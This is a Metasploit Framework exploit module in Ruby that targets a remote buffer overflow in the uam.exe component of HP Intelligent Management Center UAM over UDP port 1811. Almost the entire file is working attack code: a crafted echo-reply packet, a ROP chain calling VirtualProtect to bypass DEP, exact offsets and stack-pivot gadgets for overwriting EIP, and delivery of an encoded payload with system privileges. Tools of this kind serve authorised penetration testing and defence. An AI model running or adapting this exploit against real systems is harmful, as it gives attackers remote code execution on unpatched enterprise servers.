##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP Intelligent Management Center UAM Buffer Overflow',
			'Description'    => %q{
				This module exploits a remote buffer overflow in HP Intelligent Management Center
				UAM. The vulnerability exists in the uam.exe component, when using sprint in a
				insecure way for logging purposes. The vulnerability can be triggered by sending a
				malformed packet to the 1811/UDP port. The module has been successfully tested on
				HP iMC 5.0 E0101 and UAM 5.0 E0102 over Windows Server 2003 SP2 (DEP bypass).
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'e6af8de8b1d4b2b6d5ba2610cbf9cd38', # Vulnerability discovery
					'sinn3r', # Metasploit module
					'juan vazquez' # Metasploit module
				],
			'References'     =>
				[
					['OSVDB', '85060'],
					['BID', '55271'],
					['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-171']
				],
			'Payload'        =>
				{
					'BadChars' => "\x00\x0d\x0a",
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff", # Stack adjustment # add esp, -3500
					'Space' => 3925,
					'DisableNops' => true
				},
			'Platform'       => ['win'],
			'Targets'        =>
				[
					[ 'HP iMC 5.0 E0101 / UAM 5.0 E0102 on Windows 2003 SP2',
						{
							'Offset' => 4035,
						}
					]
				],
			'Privileged'     => true,
			'DisclosureDate' => 'Aug 29 2012',
			'DefaultTarget'  => 0))

		register_options([Opt::RPORT(1811)], self.class)
	end

	def junk(n=4)
		return rand_text_alpha(n).unpack("V")[0].to_i
	end

	def nop
		return make_nops(4).unpack("V")[0].to_i
	end

	def send_echo_reply(operator)
		packet = [0xF7103D21].pack("N") # command id
		packet << rand_text(18)
		packet << [0x102].pack("n") # watchdog command type => echo reply
		packet << "AAAA" # ip (static to make offset until EIP static)
		packet << "AA" # port (static to make offset until EIP static)
		packet << operator # Operator max length => 4066, in order to bypass packet length restriction: 4096 total

		connect_udp
		udp_sock.put(packet)
		disconnect_udp
	end


	def exploit

		# ROP chain generated with mona.py - See corelan.be
		rop_gadgets =
			[
				0x77bb2563, # POP EAX # RETN
				0x77ba1114, # <- *&VirtualProtect()
				0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
				junk,
				0x77bb0c86, # XCHG EAX,ESI # RETN
				0x77bc9801, # POP EBP # RETN
				0x77be2265, # ptr to 'push esp #  ret'
				0x77bb2563, # POP EAX # RETN
				0x03C0990F,
				0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)
				0x77bb48d3, # POP EBX, RET
				0x77bf21e0, # .data
				0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN
				0x77bbfc02, # POP ECX # RETN
				0x77bef001, # W pointer (lpOldProtect) (-> ecx)
				0x77bd8c04, # POP EDI # RETN
				0x77bd8c05, # ROP NOP (-> edi)
				0x77bb2563, # POP EAX # RETN
				0x03c0984f,
				0x77bdd441, # SUB EAX, 03c0940f
				0x77bb8285, # XCHG EAX,EDX # RETN
				0x77bb2563, # POP EAX # RETN
				nop,
				0x77be6591, # PUSHAD # ADD AL,0EF # RETN
			].pack("V*")

		bof = rand_text(14)
		bof << rop_gadgets
		bof << payload.encoded
		bof << "C" * (target['Offset'] - 14 - rop_gadgets.length - payload.encoded.length)
		bof << [0x77bb0c86].pack("V") # EIP => XCHG EAX,ESI # RETN # from msvcrt.dll
		bof << [0x77bcc397].pack("V") # ADD EAX,2C # POP EBP # RETN # from msvcrt.dll
		bof << [junk].pack("V") # EBP
		bof << [0x77bcba5e].pack("V") # XCHG EAX,ESP # RETN # from msvcrt.dll

		print_status("Trying target #{target.name}...")
		send_echo_reply(rand_text(20)) # something like... get up! ?
		send_echo_reply(bof) # exploit
	end
end
